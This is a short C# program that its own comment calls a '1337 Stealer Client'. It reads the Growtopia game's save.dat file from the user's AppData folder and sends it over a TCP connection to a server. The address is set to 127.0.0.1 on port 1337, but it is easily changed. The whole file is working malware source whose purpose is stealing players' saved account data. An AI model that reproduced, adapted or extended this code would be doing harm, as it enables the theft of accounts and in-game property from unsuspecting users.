using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace client
{
    class Program
    {
        static void Main(string[] args)
        {
            //1337 Stealer Client (c) Liab
            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
            int port = 1337;
            int bufferSize = 1024;

            TcpClient client = new TcpClient();
            NetworkStream netStream;

            // Connect to server
            try
            {
                client.Connect(new IPEndPoint(ipAddress, port));

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            netStream = client.GetStream();

        
            byte[] data = File.ReadAllBytes("C:\\Users\\" + Environment.UserName  + "\\AppData\\Local\\Growtopia\\save.dat");

            byte[] dataLength = BitConverter.GetBytes(data.Length);
            byte[] package = new byte[4 + data.Length];
            dataLength.CopyTo(package, 0);
            data.CopyTo(package, 4);

            int bytesSent = 0;
            int bytesLeft = package.Length;

            while (bytesLeft > 0)
            {

                int nextPacketSize = (bytesLeft > bufferSize) ? bufferSize : bytesLeft;

                netStream.Write(package, bytesSent, nextPacketSize);
                bytesSent += nextPacketSize;
                bytesLeft -= nextPacketSize;

            }

            netStream.Close();
            client.Close();
        }
    }
}
